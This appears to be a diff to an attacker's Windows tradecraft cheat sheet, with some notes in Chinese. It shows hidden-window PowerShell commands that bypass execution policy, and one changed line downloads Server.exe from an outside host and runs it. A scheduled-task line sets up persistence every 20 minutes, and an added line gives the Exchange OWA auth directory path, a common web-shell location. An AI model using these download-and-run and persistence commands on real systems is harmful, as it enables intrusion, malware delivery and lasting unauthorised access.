@@ -162,7 +162,7 @@ Cluster Bomb:
 . .\in.ps1 
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive —NoProfile -WindowStyle Hidden —File "C:\do_neat_ps_shit.ps1"
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive —NoProfile -WindowStyle Hidden 
-powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive —NoProfile -WindowStyle Hidden -nop -c (new-object System.Net.WebClient).DownloadFile("http://www.nan3r.tk/tool/Server.exe","$env:temp\fpm.exe");powershell -nop -c "$env:temp\fpm.exe"
+powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive —NoProfile -WindowStyle Hidden -nop -c (new-object System.Net.WebClient).DownloadFile("http://vps/tool/Server.exe","$env:temp\fpm.exe");powershell -nop -c "$env:temp\fpm.exe"
 
 schtasks /create /sc minute /mo 20 /tn "runcalc" /tr "c:\users\administrator\Appdata\local\temp\calc.exe"  计划任务每 20 分钟运行一次
 
@@ -337,3 +337,5 @@ v2ray 设置：
 	}
 }
 ]
+
+C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth
